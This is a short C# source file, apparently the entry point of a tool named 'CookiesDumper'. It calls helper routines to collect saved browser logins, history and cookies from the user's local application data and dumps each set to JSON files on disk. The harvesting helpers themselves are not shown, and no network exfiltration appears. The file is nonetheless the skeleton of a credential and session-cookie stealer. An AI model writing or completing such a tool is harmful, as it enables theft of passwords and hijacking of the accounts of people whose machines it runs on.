using System.IO;
using Newtonsoft.Json;

namespace CookiesDumper
{



	static class Program
	{

		static void Main()
		{


			string AppdataFolder = utils.appLocalPath;
			string json;
			string JsonLogin = "./LoginsJson.json";
			string JsonHistory = "./HistoryJson.json";
			string JsonCookie = "./CookiesJson.json";

			utils.GetLogins();

			if (utils.PassList.Count > 0)
			{
				json = JsonConvert.SerializeObject(utils.PassList.ToArray());
				File.WriteAllText(JsonLogin, json);
				System.Console.WriteLine("LoginsJson.json");
			}
			utils.GetHistory();

			if (utils.HistoryList.Count > 0)
			{
				json = JsonConvert.SerializeObject(utils.HistoryList.ToArray());
				File.WriteAllText(JsonHistory, json);
				System.Console.WriteLine("HistoryJson.json");

			}
			utils.GetCookies();

			if (utils.CookieList.Count > 0)
			{

				json = JsonConvert.SerializeObject(utils.CookieList.ToArray());
				File.WriteAllText(JsonCookie, json);
				System.Console.WriteLine("CookiesJson.json");


			}

		}
	}

}